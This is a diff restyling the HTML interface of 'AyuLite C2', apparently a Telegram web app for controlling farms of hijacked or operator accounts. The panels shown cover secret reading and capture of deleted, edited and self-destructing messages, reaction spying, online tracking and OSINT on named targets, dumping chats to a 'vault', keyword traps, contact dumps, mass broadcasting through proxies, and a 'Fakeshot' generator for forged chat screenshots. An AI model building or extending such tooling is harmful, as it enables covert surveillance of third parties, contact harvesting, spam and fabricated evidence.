@@ -6,50 +6,53 @@
   <meta name="theme-color" content="#09090b">
   <title>AyuLite C2</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link rel="stylesheet" href="style.css?v=12.0">
+  <link rel="stylesheet" href="style.css?v=13.0">
 </head>
 <body>
   <div class="shell">
     <!-- Top Header -->
     <header class="topbar">
       <div class="brand">
-        <span class="brand-mark">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <span class="brand-prompt">&gt;_</span>
+        <span class="brand-name">AYULITE</span>
+        <span class="brand-slash">/</span>
+        <span class="status-chip" id="connStatusChip">
+          <span class="dot" id="connDot"></span>
+          <span id="connText">SYNC</span>
         </span>
-        <span>AyuLite</span>
       </div>
       <div class="topbar-right">
         <button type="button" class="icon-btn" id="btnCmdOpen" title="Команды (Ctrl+K)">⌘K</button>
-        <button type="button" class="icon-btn" id="btnThemeCycle" title="Сменить тему">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
-        </button>
-        <div class="status-chip" id="connStatusChip">
-          <span class="dot" id="connDot"></span>
-          <span id="connText">Sync</span>
-        </div>
         <button type="button" class="tier-btn" id="userTierBadge">PRO</button>
       </div>
     </header>
 
     <!-- Offline Banner -->
     <div class="offline-bar hidden" id="offlineBar">
-      <span id="offlineMsg">Нет связи с сервером C2</span>
+      <div class="offline-text">
+        <span class="offline-code">ERR_LINK</span>
+        <span id="offlineMsg">Нет связи с сервером C2</span>
+      </div>
       <button type="button" class="btn btn-sm" id="btnRetryConn">Повторить</button>
     </div>
 
     <!-- VIEW 1: FEED -->
     <main class="view active" id="view-feed">
-      <div class="metrics-grid">
-        <div class="metric-box"><div class="metric-val" id="hudDeleted">0</div><div class="metric-lbl">Удаления</div></div>
-        <div class="metric-box"><div class="metric-val" id="hudEdited">0</div><div class="metric-lbl">Правки</div></div>
-        <div class="metric-box"><div class="metric-val" id="hudTtl">0</div><div class="metric-lbl">TTL медиа</div></div>
-        <div class="metric-box"><div class="metric-val" id="hudReactions">0</div><div class="metric-lbl">Реакции</div></div>
+      <!-- Compact 1-line Terminal Telemetry -->
+      <div class="telemetry-strip">
+        <div class="tel-item"><span class="tel-k">DEL</span><span class="tel-v err" id="hudDeleted">0</span></div>
+        <div class="tel-sep">·</div>
+        <div class="tel-item"><span class="tel-k">EDT</span><span class="tel-v warn" id="hudEdited">0</span></div>
+        <div class="tel-sep">·</div>
+        <div class="tel-item"><span class="tel-k">TTL</span><span class="tel-v warn" id="hudTtl">0</span></div>
+        <div class="tel-sep">·</div>
+        <div class="tel-item"><span class="tel-k">RX</span><span class="tel-v" id="hudReactions">0</span></div>
       </div>
 
-      <div class="toolbar">
-        <input type="search" class="input" id="feedSearchInput" placeholder="Поиск по тексту, имени или чату..." style="flex:1; min-width: 180px;">
-        <button type="button" class="btn btn-sm" id="btnFeedRefresh">Обновить</button>
+      <div class="toolbar feed-toolbar">
+        <input type="search" class="input" id="feedSearchInput" placeholder="Поиск по тексту, имени, чату..." style="flex:1;min-width:0;">
         <button type="button" class="btn btn-sm" id="btnOpenSnatcher">Snatcher</button>
+        <button type="button" class="icon-btn" id="btnFeedRefresh" title="Обновить">↻</button>
       </div>
 
       <div class="chips" id="feedFilterChips">
@@ -58,7 +61,7 @@
         <button type="button" class="chip" data-filter="edited">Правки <span id="cntEd">0</span></button>
         <button type="button" class="chip" data-filter="ttl">TTL <span id="cntTtl">0</span></button>
         <button type="button" class="chip" data-filter="reactions">Реакции <span id="cntReact">0</span></button>
-        <button type="button" class="chip" data-filter="media">С медиа</button>
+        <button type="button" class="chip" data-filter="media">Медиа</button>
       </div>
 
       <div id="feedList"><div class="empty">Загрузка ленты перехватов...</div></div>
@@ -67,18 +70,18 @@
     <!-- VIEW 2: VAULT -->
     <main class="view" id="view-vault">
       <div class="vault-top">
-        <div class="card" style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;">
+        <div class="card vault-banner">
           <div>
             <div class="row-title" id="vaultForumTitle">AyuVault • Сейф</div>
             <div class="row-sub" id="vaultForumMeta">Синхронизация супергруппы-сейфа...</div>
           </div>
-          <div style="display:flex;gap:6px;">
-            <a href="#" target="_blank" class="btn btn-sm hidden" id="vaultForumLink">Открыть в TG</a>
-            <button type="button" class="btn btn-sm btn-primary" id="btnSyncVaultForum">Синхронизировать</button>
+          <div style="display:flex;gap:8px;">
+            <a href="#" target="_blank" class="btn btn-sm hidden" id="vaultForumLink">В TG</a>
+            <button type="button" class="btn btn-sm btn-primary" id="btnSyncVaultForum">Синхр.</button>
           </div>
         </div>
         <div class="toolbar">
-          <input type="search" class="input" id="vaultChatSearch" placeholder="Фильтр диалогов..." style="flex:1;">
+          <input type="search" class="input" id="vaultChatSearch" placeholder="Фильтр диалогов..." style="flex:1;min-width:0;">
           <span class="tag" id="vaultChatsTotal">0 чатов</span>
         </div>
       </div>
@@ -88,15 +91,15 @@
       </div>
 
       <div class="card vault-chat-col" id="vaultConvWrap" style="display:none;">
-        <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;padding-bottom:10px;border-bottom:1px solid var(--border);margin-bottom:10px;">
-          <button type="button" class="btn btn-sm" id="btnBackToChats">← Чаты</button>
-          <span class="row-title" id="activeChatTitle" style="flex:1;">Выберите диалог</span>
+        <div class="vault-chat-head">
+          <button type="button" class="btn btn-sm" id="btnBackToChats">← Назад</button>
+          <span class="row-title" id="activeChatTitle" style="flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">Выберите диалог</span>
           <div style="display:flex;gap:6px;">
-            <button type="button" class="btn btn-sm" id="btnVaultDump">Дамп в Сейф</button>
-            <button type="button" class="btn btn-sm" id="btnVaultShadow">Shadow Forward</button>
+            <button type="button" class="btn btn-sm" id="btnVaultDump">Дамп</button>
+            <button type="button" class="btn btn-sm" id="btnVaultShadow">Shadow</button>
           </div>
         </div>
-        <div id="vaultMessagesStream"><div class="empty">Выберите диалог из списка слева</div></div>
+        <div id="vaultMessagesStream"><div class="empty">Выберите диалог из списка</div></div>
       </div>
     </main>
 
@@ -104,21 +107,21 @@
     <main class="view" id="view-stealth">
       <div class="sec-head"><span class="sec-title">Режимы скрытности</span></div>
       <div class="card card-flush">
-        <div class="row"><div><div class="row-title">Ghost Read</div><div class="row-sub">Чтение входящих без отметки прочтения</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="ghost_read"><span class="slider"></span></label></div>
+        <div class="row"><div><div class="row-title">Ghost Read</div><div class="row-sub">Чтение входящих без отметки</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="ghost_read"><span class="slider"></span></label></div>
         <div class="row"><div><div class="row-title">Anti-Delete</div><div class="row-sub">Перехват удалённых сообщений и медиа</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="anti_delete" checked><span class="slider"></span></label></div>
         <div class="row"><div><div class="row-title">Anti-Edit</div><div class="row-sub">Фиксация истории редактирования</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="anti_edit" checked><span class="slider"></span></label></div>
         <div class="row"><div><div class="row-title">TTL Grabber</div><div class="row-sub">Автосохранение одноразовых фото и видео</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="auto_ttl" checked><span class="slider"></span></label></div>
         <div class="row"><div><div class="row-title">Reaction Spy</div><div class="row-sub">Логирование поставленных и снятых реакций</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="reaction_spy" checked><span class="slider"></span></label></div>
-        <div class="row"><div><div class="row-title">Silent Ear (STT)</div><div class="row-sub">Автоматическая расшифровка голосовых</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="silent_ear" checked><span class="slider"></span></label></div>
-        <div class="row"><div><div class="row-title">Always Offline</div><div class="row-sub">Принудительный оффлайн-статус аккаунта</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="stealth_always_enabled"><span class="slider"></span></label></div>
-        <div class="row"><div><div class="row-title">Silent Typing</div><div class="row-sub">Блокировка статуса «печатает» и «записывает»</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="stealth_typing"><span class="slider"></span></label></div>
+        <div class="row"><div><div class="row-title">Silent Ear (STT)</div><div class="row-sub">Авторасшифровка голосовых</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="silent_ear" checked><span class="slider"></span></label></div>
+        <div class="row"><div><div class="row-title">Always Offline</div><div class="row-sub">Принудительный оффлайн-статус</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="stealth_always_enabled"><span class="slider"></span></label></div>
+        <div class="row"><div><div class="row-title">Silent Typing</div><div class="row-sub">Скрывать «печатает» и «записывает»</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="stealth_typing"><span class="slider"></span></label></div>
         <div class="row"><div><div class="row-title">Silent VoIP Guard</div><div class="row-sub">Защита и лог входящих звонков</div></div><label class="switch"><input type="checkbox" class="trigger-sw" data-trigger="voip_guard" checked><span class="slider"></span></label></div>
       </div>
 
       <div class="sec-head"><span class="sec-title">Online Tracker</span></div>
       <div class="card">
         <div class="toolbar">
-          <input type="text" class="input" id="inputTrackerTarget" placeholder="ID или @username цели" style="flex:1;">
+          <input type="text" class="input" id="inputTrackerTarget" placeholder="ID или @username цели" style="flex:1;min-width:0;">
           <button type="button" class="btn btn-primary btn-sm" id="btnTrackerAdd">Добавить</button>
         </div>
         <div id="onlineTrackerList"><div class="empty" style="padding:12px;">Нет отслеживаемых целей</div></div>
@@ -126,7 +129,7 @@
 
       <div class="sec-head"><span class="sec-title">OSINT Разведка</span></div>
       <div class="card">
-        <input type="text" class="input" id="inputReconTarget" placeholder="ID или @username пользователя / канала" style="margin-bottom:8px;">
+        <input type="text" class="input" id="inputReconTarget" placeholder="ID или @username пользователя / канала" style="margin-bottom:10px;">
         <div class="toolbar" style="margin-bottom:0;">
           <button type="button" class="btn btn-sm" id="btnReconShared" style="flex:1;">Общие чаты</button>
           <button type="button" class="btn btn-sm" id="btnReconStories" style="flex:1;">Истории</button>
@@ -138,7 +141,7 @@
     <!-- VIEW 4: FARM & OPS -->
     <main class="view" id="view-farm">
       <div class="sec-head">
-        <span class="sec-title">Метрики и здоровье</span>
+        <span class="sec-title">Телеметрия воркеров</span>
         <div style="display:flex;gap:6px;">
           <button type="button" class="btn btn-sm" id="btnFarmHealth">Пинг</button>
           <button type="button" class="btn btn-sm btn-primary" id="btnFarmRecover">Recover</button>
@@ -148,9 +151,9 @@
         <div class="metric-box"><div class="metric-val" id="mIntercepted">0</div><div class="metric-lbl">Сообщений</div></div>
         <div class="metric-box"><div class="metric-val" id="mDeletes">0</div><div class="metric-lbl">Удалений</div></div>
         <div class="metric-box"><div class="metric-val" id="mMedia">0</div><div class="metric-lbl">Медиа</div></div>
-        <div class="metric-box"><div class="metric-val" id="mVault">0</div><div class="metric-lbl">Доставлено</div></div>
+        <div class="metric-box"><div class="metric-val" id="mVault">0</div><div class="metric-lbl">В сейфе</div></div>
       </div>
-      <div id="farmHealthChips" class="chips" style="margin-bottom:10px;"></div>
+      <div id="farmHealthChips" class="chips" style="margin-bottom:12px;"></div>
 
       <div class="sec-head">
         <span class="sec-title">Аккаунты</span>
@@ -165,28 +168,28 @@
       <div class="sec-head"><span class="sec-title">Keyword Traps</span></div>
       <div class="card">
         <div class="toolbar">
-          <select id="selectTrapSession" class="input" style="max-width:160px;"></select>
-          <input type="text" id="inputTrapKeyword" class="input" placeholder="Ключевое слово..." style="flex:1;">
-          <button type="button" class="btn btn-sm btn-primary" id="btnTrapAdd">Добавить</button>
+          <select id="selectTrapSession" class="input" style="max-width:140px;"></select>
+          <input type="text" id="inputTrapKeyword" class="input" placeholder="Ключевое слово..." style="flex:1;min-width:0;">
+          <button type="button" class="btn btn-sm btn-primary" id="btnTrapAdd">+</button>
         </div>
         <div id="keywordTrapList" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
       </div>
 
-      <div class="sec-head"><span class="sec-title">Рассылка v2 & Планировщик</span></div>
+      <div class="sec-head"><span class="sec-title">Рассылка и планировщик</span></div>
       <div class="card">
         <input type="text" id="inputBcastTargets" class="input" placeholder="Получатели через запятую (ID или @username)" style="margin-bottom:8px;">
         <div class="toolbar">
-          <input type="text" id="inputBcastText" class="input" placeholder="Текст сообщения..." style="flex:1;">
-          <button type="button" class="btn btn-sm btn-primary" id="btnBcastSend">Запустить</button>
+          <input type="text" id="inputBcastText" class="input" placeholder="Текст сообщения..." style="flex:1;min-width:0;">
+          <button type="button" class="btn btn-sm btn-primary" id="btnBcastSend">Старт</button>
         </div>
-        <div style="border-top:1px solid var(--border);padding-top:10px;margin-top:6px;">
-          <div class="toolbar">
-            <select id="selectSchedType" class="input" style="max-width:150px;">
+        <div style="border-top:1px solid var(--border);padding-top:10px;margin-top:8px;">
+          <div class="toolbar" style="margin-bottom:8px;">
+            <select id="selectSchedType" class="input" style="flex:1;min-width:120px;">
               <option value="contact_dump">Дамп контактов</option>
               <option value="broadcast">Рассылка</option>
             </select>
-            <input type="number" id="inputSchedHour" class="input" value="9" min="0" max="23" style="max-width:68px;" title="Час">
-            <input type="number" id="inputSchedMin" class="input" value="0" min="0" max="59" style="max-width:68px;" title="Минута">
+            <input type="number" id="inputSchedHour" class="input" value="9" min="0" max="23" style="width:62px;" title="Час">
+            <input type="number" id="inputSchedMin" class="input" value="0" min="0" max="59" style="width:62px;" title="Минута">
             <button type="button" class="btn btn-sm" id="btnSchedAdd">Создать</button>
           </div>
           <div id="schedulerTasksList"></div>
@@ -195,14 +198,14 @@
 
       <div class="sec-head"><span class="sec-title">Sticky Proxy Pool</span></div>
       <div class="card">
-        <div class="toolbar">
-          <select id="selectProxyType" class="input" style="max-width:95px;">
+        <div class="toolbar" style="margin-bottom:8px;">
+          <select id="selectProxyType" class="input" style="width:94px;">
             <option value="socks5">SOCKS5</option>
             <option value="http">HTTP</option>
           </select>
-          <input type="text" id="inputProxyHost" class="input" placeholder="Host / IP" style="flex:1;min-width:110px;">
-          <input type="number" id="inputProxyPort" class="input" placeholder="Port" style="max-width:85px;">
-          <button type="button" class="btn btn-sm" id="btnProxyAdd">Добавить</button>
+          <input type="text" id="inputProxyHost" class="input" placeholder="Host / IP" style="flex:1;min-width:100px;">
+          <input type="number" id="inputProxyPort" class="input" placeholder="Port" style="width:76px;">
+          <button type="button" class="btn btn-sm" id="btnProxyAdd">+</button>
         </div>
         <div id="proxyPoolList"></div>
       </div>
@@ -227,21 +230,25 @@
       <div class="card card-flush">
         <div class="row"><span class="row-sub">Статус воркера</span><span class="tag" id="opWorkerStatus">Ожидание</span></div>
         <div class="row"><span class="row-sub">Канал Сейфа</span><span class="tag" id="opSafeChannel">—</span></div>
+        <div class="row">
+          <span class="row-sub">Тема терминала</span>
+          <button type="button" class="btn btn-sm" id="btnThemeCycle">Переключить</button>
+        </div>
       </div>
 
       <div class="sec-head"><span class="sec-title">Подписка и промокод</span></div>
       <div class="card">
         <div class="toolbar">
-          <input type="text" id="inputPromoCode" class="input" placeholder="Введите промокод..." style="flex:1;">
+          <input type="text" id="inputPromoCode" class="input" placeholder="Введите промокод..." style="flex:1;min-width:0;">
           <button type="button" class="btn btn-sm btn-primary" id="btnRedeemPromo">Применить</button>
         </div>
         <div style="display:flex;gap:8px;flex-wrap:wrap;">
           <button type="button" class="btn btn-sm" id="btnOpenStore" style="flex:1;">Тарифы (Stars)</button>
-          <button type="button" class="btn btn-sm" id="btnClaimTrial" style="flex:1;">Активировать триал</button>
+          <button type="button" class="btn btn-sm" id="btnClaimTrial" style="flex:1;">Триал</button>
         </div>
       </div>
 
-      <div class="sec-head"><span class="sec-title">Инструменты и управление</span></div>
+      <div class="sec-head"><span class="sec-title">Инструменты</span></div>
       <div class="card" style="display:flex;flex-direction:column;gap:8px;">
         <button type="button" class="btn btn-block" id="btnOpenFakeshot">Fakeshot Studio (iOS 18)</button>
         <button type="button" class="btn btn-block" id="btnSaveLast">Сохранить последнее из активного чата</button>
@@ -340,11 +347,11 @@
           <option value="midnight">OLED Чёрная</option>
           <option value="light">Светлая</option>
         </select>
-        <label style="display:flex;align-items:center;gap:8px;font-size:12.5px;"><input type="checkbox" id="fakeVerified" checked> Галочка верификации</label>
-        <label style="display:flex;align-items:center;gap:8px;font-size:12.5px;"><input type="checkbox" id="fakeSendToSaved"> Отправить сразу в Избранное</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;"><input type="checkbox" id="fakeVerified" checked> Галочка верификации</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:13px;"><input type="checkbox" id="fakeSendToSaved"> Отправить сразу в Избранное</label>
         <div style="border-top:1px solid var(--border);padding-top:8px;">
           <div class="toolbar">
-            <input type="text" class="input" id="fakeMsgText" placeholder="Текст сообщения..." style="flex:1;">
+            <input type="text" class="input" id="fakeMsgText" placeholder="Текст сообщения..." style="flex:1;min-width:0;">
             <select class="input" id="fakeMsgSide" style="max-width:110px;">
               <option value="in">Входящее</option>
               <option value="out">Исходящее</option>
@@ -355,7 +362,7 @@
         </div>
         <button type="button" class="btn btn-primary btn-block" id="btnFakeRender">Сгенерировать</button>
         <div id="fakePreviewWrap" style="display:none;text-align:center;margin-top:8px;">
-          <img id="fakePreviewImg" src="" alt="Preview" style="max-width:100%;border-radius:10px;border:1px solid var(--border);">
+          <img id="fakePreviewImg" src="" alt="Preview" style="max-width:100%;border-radius:6px;border:1px solid var(--border);">
           <a id="fakeDownloadLink" href="#" download="fakeshot.png" class="btn btn-sm btn-block" style="margin-top:8px;text-decoration:none;">Скачать PNG</a>
         </div>
       </div>
@@ -387,6 +394,6 @@
   </div>
 
   <div class="toast" id="toast"></div>
-  <script src="app.js?v=12.0"></script>
+  <script src="app.js?v=13.0"></script>
 </body>
 </html>
